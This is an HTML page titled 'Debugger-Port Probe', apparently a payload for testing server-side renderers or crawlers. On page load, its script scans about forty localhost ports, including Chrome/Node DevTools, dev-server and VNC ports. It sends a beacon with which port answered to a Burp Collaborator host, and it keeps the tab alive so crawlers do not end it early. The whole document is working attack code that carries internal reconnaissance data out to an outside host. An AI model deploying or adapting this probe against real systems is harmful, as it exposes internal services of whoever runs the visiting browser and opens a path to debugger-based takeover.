<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Debugger-Port Probe</title>
<style>
  body { font-family: system-ui, sans-serif; margin: 2rem; }
  #status { margin-top: 1rem; font-weight: 600; }
</style>
</head>
<body>
<h1>Scanning localhost for debugger/dev ports …</h1>
<div id="status">Initialising …</div>

<script>
/* ─── CONFIG ──────────────────────────────────────────────────────────── */
const COLLAB = 'https://457mfhvylme5j9ytk1x6ns9j1a72v3js.oastify.com';
/* 40-ish ports: Chrome/Node debug, dev servers, Elastic, VNC, etc. */
const PORTS = [
  80, 443, 9200, 9220, 9221, 9222, 9223, 9224, 9225, 9226, 9227, 9228, 9229,
  9230, 9231, 9232, 9233, 9234, 9235, 9876, 9877, 10000, 10080, 11000, 12000,
  1337, 15000, 18080, 20000, 3000, 3001, 3002, 3333, 4444, 5000, 5050, 5555,
  5900, 5985, 6006, 6080, 7000, 7001, 7777, 8080, 9443
];
const PATHS = ['', 'json'];          // root & common DevTools endpoint
const TIMEOUT = 3500;                // ms per request
/* ─────────────────────────────────────────────────────────────────────── */

function beacon(slug) {
  /* fast, reliable HTTPS hit to Burp Collaborator */
  fetch(`${COLLAB}/${slug}`, { mode: 'no-cors', cache: 'no-store', keepalive: true })
    .catch(() => {}); // ignore network-layer errors
}

function probe(url) {
  return new Promise(res => {
    const ctrl  = new AbortController();
    const timer = setTimeout(() => { ctrl.abort(); res(false); }, TIMEOUT);
    fetch(url, { mode: 'no-cors', cache: 'no-store', signal: ctrl.signal })
      .then(() => { clearTimeout(timer); res(true); })
      .catch(()  => { clearTimeout(timer); res(false); });
  });
}

/* ─── MAIN ────────────────────────────────────────────────────────────── */
(async () => {
  /* 0️⃣  Confirm JS execution & outbound TLS to Collaborator */
  beacon('page-loaded');
  document.getElementById('status').textContent = 'JS running – test beacon sent.';

  /* Keep the event loop busy so impatient crawlers don’t kill the tab */
  const keepAlive = setInterval(() => {}, 1000);
  setTimeout(() => clearInterval(keepAlive), 10000);

  let openHit = null;                // {port,path} once something answers
  const tasks = [];

  for (const port of PORTS) {
    for (const path of PATHS) {
      const url = `http://127.0.0.1:${port}/${path}`;
      tasks.push(
        probe(url).then(ok => {
          if (ok && !openHit) openHit = { port, path };
        })
      );
    }
  }

  /* Run the whole batch in parallel */
  await Promise.allSettled(tasks);

  if (openHit) {
    const slug = `open-${openHit.port}-${openHit.path || 'root'}`;
    document.getElementById('status').textContent =
      `✅ Port ${openHit.port} replied at /${openHit.path || ''}`;
    beacon(slug);
  } else {
    document.getElementById('status').textContent =
      '❌ Scan finished – no open ports.';
    beacon('no-port-found');
  }
})();
</script>
</body>
</html>
